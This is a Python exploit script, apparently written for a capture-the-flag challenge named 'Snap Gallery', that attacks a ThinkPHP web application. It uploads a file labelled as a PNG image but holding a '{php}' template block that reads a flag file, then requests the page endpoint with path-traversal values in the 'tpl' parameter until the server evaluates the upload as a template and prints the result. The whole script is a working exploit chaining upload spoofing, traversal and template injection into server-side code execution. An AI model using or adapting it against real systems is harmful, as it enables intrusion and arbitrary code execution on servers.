#!/usr/bin/env python3
"""Snap Gallery CTF: upload and diagnose ThinkPHP template evaluation."""
import argparse
import html
import re
import uuid
from pathlib import Path
from urllib.parse import urlsplit
import requests
from bs4 import BeautifulSoup


def summary(response):
    soup = BeautifulSoup(response.text, 'html.parser')
    for tag in soup(['style', 'script']):
        tag.decompose()
    text = soup.get_text(' ', strip=True)
    for pattern in (r'(?:模板文件不存在|模板不存在|template file not exists|template not exists)[^\n]{0,250}',
                    r'(?:syntax error|ParseError|ErrorException|Exception|错误位置|错误信息)[^\n]{0,300}'):
        match = re.search(pattern, text, re.I)
        if match:
            return match.group(0)[:500]
    return text[:650] or response.text[:650]


def main():
    p = argparse.ArgumentParser()
    p.add_argument('url', help='http://10.234.128.28:22200 (use colon for port)')
    p.add_argument('--flag-path', default='/flag.txt')
    p.add_argument('--debug-dir', default='snap_debug')
    args = p.parse_args()
    base = args.url.strip().strip('<>').rstrip('/')
    if base.startswith('[') and '](' in base:
        base = base[1:base.index('](')]
    parsed = urlsplit(base)
    if parsed.scheme not in ('http', 'https') or not parsed.hostname:
        p.error('invalid URL')
    output = Path(args.debug_dir)
    output.mkdir(exist_ok=True)
    name = 'snap_' + uuid.uuid4().hex[:12] + '.html'
    marker = 'SNAP_RESULT_'
    payload = marker + '{php}echo file_get_contents(' + repr(args.flag_path) + ');{/php}' + '_END'
    session = requests.Session()
    try:
        print('[+] Upload:', name)
        r = session.post(base + '/index.php/upload/upload', files={'image': (name, payload.encode(), 'image/png')}, timeout=20)
        (output / 'upload.html').write_text(r.text, encoding='utf-8')
        print('[+] Upload HTTP', r.status_code, '|', summary(r))
        if r.status_code != 200 or not any(x in r.text for x in ('アップロード成功', '上传成功', '保存名:')):
            print('[-] Upload success not confirmed; see', output / 'upload.html')
            return 1
        # Probe alternate relative paths: actual resolution depends on template engine rules.
        stem = name[:-5]
        paths = [f'../../storage/topic/{stem}', f'../../../storage/topic/{stem}',
                 f'../storage/topic/{stem}', f'storage/topic/{stem}']
        for i, tpl in enumerate(paths, 1):
            print(f'\n[+] Probe {i}/{len(paths)}: {tpl}')
            r = session.get(base + '/index.php/index/page', params={'tpl': tpl}, timeout=20)
            path = output / f'render_{i}.html'
            path.write_text(r.text, encoding='utf-8')
            print('[+] HTTP', r.status_code, '|', summary(r))
            m = re.search(re.escape(marker) + r'(.*?)_END', r.text, re.S)
            if m:
                print('[+] FLAG OUTPUT:', html.unescape(m.group(1)))
                return 0
            print('[i] Full response:', path)
        print('\n[-] No marker found. Share snap_debug/render_*.html error message for next adjustment.')
        return 1
    except requests.RequestException as e:
        print('[-] Request failed:', e)
        return 1

if __name__ == '__main__':
    raise SystemExit(main())
